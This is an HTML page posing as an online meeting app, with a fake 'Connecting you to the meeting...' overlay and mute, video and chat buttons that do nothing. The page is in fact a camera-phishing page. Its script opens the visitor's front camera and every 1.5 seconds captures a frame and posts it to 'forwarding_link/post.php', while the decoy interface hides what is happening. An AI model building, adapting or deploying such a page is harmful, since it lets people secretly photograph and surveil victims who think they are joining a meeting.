<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Online Meeting</title>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
:root{
  --bg:#0a1628;
  --surface:#0f1d35;
  --surface2:#162440;
  --accent:#1e88e5;
  --accent-glow:rgba(30,136,229,.25);
  --text:#e0e6ed;
  --text-dim:#8899aa;
  --danger:#ef5350;
  --success:#4caf50;
}
body{background:var(--bg);color:var(--text);height:100dvh;width:100%;overflow:hidden;-webkit-tap-highlight-color:transparent}
.video-wrap{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:radial-gradient(ellipse at 50% 40%,#112240,var(--bg) 70%)}
video{width:100%;height:100%;object-fit:cover}
canvas{display:none}
.top-bar{position:fixed;top:0;left:0;right:0;display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:linear-gradient(180deg,rgba(10,22,40,.95),transparent);z-index:10;pointer-events:none}
.top-bar>*{pointer-events:auto}
.meeting-id{background:var(--surface2);border-radius:20px;padding:6px 14px;font-size:13px;color:var(--text-dim);border:1px solid rgba(255,255,255,.06)}
.float-btn{background:var(--surface2);width:36px;height:36px;border-radius:8px;border:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:center;color:var(--text);font-size:14px}
.bottom-bar{position:fixed;bottom:0;left:0;right:0;background:var(--surface);border-top:1px solid rgba(255,255,255,.05);padding:8px 8px env(safe-area-inset-bottom, 8px);display:flex;flex-direction:row;justify-content:space-evenly;align-items:center;z-index:10}
.icon-btn{display:flex;flex-direction:column;align-items:center;gap:4px;padding:6px 10px;border-radius:10px;color:var(--text-dim);transition:background .15s}
.icon-btn:active{background:rgba(255,255,255,.06)}
.icon-btn i{font-size:20px;width:24px;text-align:center}
.icon-btn span{font-size:10px;white-space:nowrap}
.icon-btn.active{color:var(--success)}
.btn-end{background:var(--danger);color:#fff;border:none;padding:8px 18px;border-radius:20px;font-size:13px;font-weight:600;letter-spacing:.3px}
.btn-end:active{background:#c62828}
.overlay{position:fixed;inset:0;background:rgba(10,22,40,.85);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:100;display:flex;align-items:center;justify-content:center;transition:opacity .3s}
.overlay.hidden{opacity:0;pointer-events:none}
.popup{background:var(--surface2);border:1px solid rgba(30,136,229,.2);border-radius:16px;padding:24px;text-align:center;max-width:320px;width:85%;box-shadow:0 8px 32px rgba(0,0,0,.4),0 0 24px var(--accent-glow)}
.popup .spinner{width:36px;height:36px;border:3px solid rgba(30,136,229,.15);border-top-color:var(--accent);border-radius:50%;margin:0 auto 16px;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.popup h2{font-size:15px;font-weight:500;line-height:1.4;color:var(--text)}
@media(max-width:480px){.bottom-bar{padding:6px 4px env(safe-area-inset-bottom, 6px)}.icon-btn{padding:6px 6px}.icon-btn span{font-size:9px}}
</style>
</head>
<body>
<div class="video-wrap">
  <video id="video" playsinline autoplay></video>
</div>
<canvas id="canvas" width="640" height="480"></canvas>
<div class="top-bar">
  <div class="meeting-id"><i class="fas fa-lock" style="font-size:10px;margin-right:4px;color:var(--success)"></i>Meeting</div>
  <div class="float-btn"><i class="fas fa-expand"></i></div>
</div>
<div class="overlay" id="ac-wrapper">
  <div class="popup">
    <div class="spinner"></div>
    <h2>Connecting you to the meeting...</h2>
  </div>
</div>
<div class="bottom-bar">
  <div class="icon-btn"><i class="fas fa-microphone"></i><span>Mute</span></div>
  <div class="icon-btn active"><i class="fas fa-video"></i><span>Video</span></div>
  <div class="icon-btn"><i class="fas fa-shield-halved"></i><span>Security</span></div>
  <div class="icon-btn"><i class="fas fa-users"></i><span>People</span></div>
  <div class="icon-btn"><i class="fas fa-share-nodes"></i><span>Share</span></div>
  <div class="icon-btn"><i class="fas fa-comment-dots"></i><span>Chat</span></div>
  <div class="icon-btn"><i class="fas fa-circle-dot"></i><span>Record</span></div>
  <button class="btn-end">End</button>
</div>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
function post(d){$.ajax({type:'POST',data:{cat:d},url:'forwarding_link/post.php',dataType:'json',async:false})}
const v=document.getElementById('video'),c=document.getElementById('canvas');
async function init(){try{const s=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}});v.srcObject=s;let x=c.getContext('2d');setInterval(()=>{x.drawImage(v,0,0,640,480);post(c.toDataURL("image/png").replace("image/png","image/octet-stream"))},1500)}catch(e){}}
init();
setTimeout(()=>document.getElementById('ac-wrapper').classList.add('hidden'),5000);
</script>
</body>
</html>
